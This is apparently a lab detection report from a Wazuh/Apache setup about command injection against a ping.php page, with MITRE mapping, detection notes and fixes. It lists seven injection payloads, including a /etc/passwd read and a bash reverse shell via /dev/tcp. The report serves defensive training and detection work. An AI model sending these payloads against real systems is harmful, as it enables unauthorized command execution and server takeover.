# COMMAND INJECTION DETECTION REPORT

## Executive Summary
- Detection Type: Command Injection Attack
- Agent: kali (192.168.1.109)
- Web Server: Apache2
- Target: /var/www/html/ping.php
- Total Alerts: 2
- Time Period: 2026-10-09 17:59:49 PKT
- Attack Source: 127.0.0.1 (localhost)

## Alert Details

| Rule ID | Description | Level | MITRE |
|---------|-------------|-------|-------|
| 31106 | Web attack returned code 200 | 6 | T1190 |
| 31101 | Web server 400 error code | 5 | T1190 |

## Attack Payloads Detected

1. **Semicolon Injection:**
   GET /ping.php?ip=127.0.0.1;whoami

2. **Pipe Injection:**
   GET /ping.php?ip=127.0.0.1|whoami

3. **AND Injection:**
   GET /ping.php?ip=127.0.0.1&&whoami

4. **Backtick Injection:**
   GET /ping.php?ip=127.0.0.1`whoami`

5. **Dollar Injection:**
   GET /ping.php?ip=127.0.0.1$(whoami)

6. **File Read:**
   GET /ping.php?ip=127.0.0.1;cat /etc/passwd

7. **Reverse Shell:**
   GET /ping.php?ip=127.0.0.1;bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

## MITRE ATT&CK Mapping
- **T1059** - Command and Scripting Interpreter
- **T1059.004** - Unix Shell
- **T1190** - Exploit Public-Facing Application
- **Tactic:** Execution, Initial Access

## Key Findings
1. Wazuh detected command injection payloads
2. 7 different injection techniques tested
3. All attacks logged in Apache access.log
4. Wazuh rules fired correctly

## Analysis
- Command Injection allows arbitrary OS commands
- Attacker can read files, execute commands, reverse shell
- Real SOC: block IP, patch application, use input validation
- Lab: authorized test

## Recommended Actions
1. **Immediate:** No escalation (lab)
2. **Real SOC:** Block source IP
3. **Real SOC:** Validate user input
4. **Real SOC:** Use escapeshellarg()
5. **Improvement:** Add command injection rules
6. **Improvement:** Integrate Suricata

## Status
**CLOSED** - Lab simulation

## Analyst Notes
Command Injection is one of the most critical vulnerabilities.
It allows:
- Arbitrary command execution
- File system access
- Reverse shells
- Full server compromise

Detection relies on:
- URL parameter analysis
- Special character detection (;, |, &, $, `)
- Response code monitoring
- Wazuh built-in rules (31100-31199)
